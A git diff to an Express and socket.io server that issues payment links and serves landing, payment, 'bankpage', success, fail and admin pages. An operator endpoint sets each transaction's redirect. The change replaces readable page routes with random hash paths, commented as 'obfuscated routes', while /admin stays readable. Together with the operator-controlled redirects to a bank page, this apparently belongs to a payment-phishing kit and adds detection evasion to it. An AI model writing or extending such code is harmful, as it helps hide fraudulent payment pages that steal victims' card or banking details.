@@ -3,7 +3,7 @@ import bodyParser from 'body-parser';
 import cors from 'cors';
 import crypto from 'crypto';
 import { Server } from 'socket.io';
-import path from 'path'; // Add this import
+import path from 'path';
 
 const app = express();
 app.use(bodyParser.json());
@@ -12,19 +12,33 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Clean URL handling - Add this section
-const htmlPages = ['landing', 'payment', 'success', 'fail', 'bankpage', 'admin'];
+// Map of route hashes to actual HTML files
+const routeHashMap = new Map();
 
-// Add route handlers for clean URLs (without .html extension)
-htmlPages.forEach(page => {
-  app.get(`/${page}`, (req, res) => {
+// Generate random hashes for each page
+const pageHashes = {
+  landing: crypto.randomBytes(10).toString('hex'),
+  payment: crypto.randomBytes(10).toString('hex'),
+  success: crypto.randomBytes(10).toString('hex'),
+  fail: crypto.randomBytes(10).toString('hex'),
+  bankpage: crypto.randomBytes(10).toString('hex'),
+  admin: 'admin' // Keep admin accessible via /admin for ease of use
+};
+
+// Create obfuscated routes
+Object.entries(pageHashes).forEach(([page, hash]) => {
+  // Store hash -> page mapping for lookups
+  routeHashMap.set(hash, `${page}.html`);
+  
+  // Create route with the hash
+  app.get(`/${hash}`, (req, res) => {
     res.sendFile(path.join(process.cwd(), `${page}.html`));
   });
 });
 
-// Redirect root to landing page (optional)
+// Redirect root to landing page hash
 app.get('/', (req, res) => {
-  res.redirect('/landing');
+  res.redirect(`/${pageHashes.landing}`);
 });
 
 // Serve static files after our routes
@@ -33,6 +47,10 @@ app.use(express.static("."));
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log('Page hashes:');
+  Object.entries(pageHashes).forEach(([page, hash]) => {
+    console.log(`${page}: /${hash}`);
+  });
 });
 
 const io = new Server(server);
@@ -55,8 +73,8 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Updated URL without .html
-    const paymentLink = `${protocol}://${req.get('host')}/landing?pid=${invoiceId}`;
+    // Use the obfuscated hash instead of 'landing.html'
+    const paymentLink = `${protocol}://${req.get('host')}/${pageHashes.landing}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -158,11 +176,11 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   }
 
   if (txn.redirectStatus) {
-    // Updated URLs without .html
+    // Use the obfuscated hashes instead of page names
     const redirectUrls = {
-      success: `/success?invoiceId=${invoiceId}`,
-      fail: `/fail?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
-      bankpage: `/bankpage?invoiceId=${invoiceId}`
+      success: `/${pageHashes.success}?invoiceId=${invoiceId}`,
+      fail: `/${pageHashes.fail}?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/${pageHashes.bankpage}?invoiceId=${invoiceId}`
     };
     return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
@@ -192,17 +210,17 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     txn.failureReason = failureReason;
   }
 
-  // Updated URLs without .html
+  // Use the obfuscated hashes instead of page names
   const redirectUrls = {
-    success: `/success?invoiceId=${invoiceId}`,
-    fail: `/fail?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+    success: `/${pageHashes.success}?invoiceId=${invoiceId}`,
+    fail: `/${pageHashes.fail}?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
   };
 
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectUrls[redirectStatus] || `/bankpage?invoiceId=${invoiceId}`
+    redirectUrl: redirectUrls[redirectStatus] || `/${pageHashes.bankpage}?invoiceId=${invoiceId}`
   });
 });
 
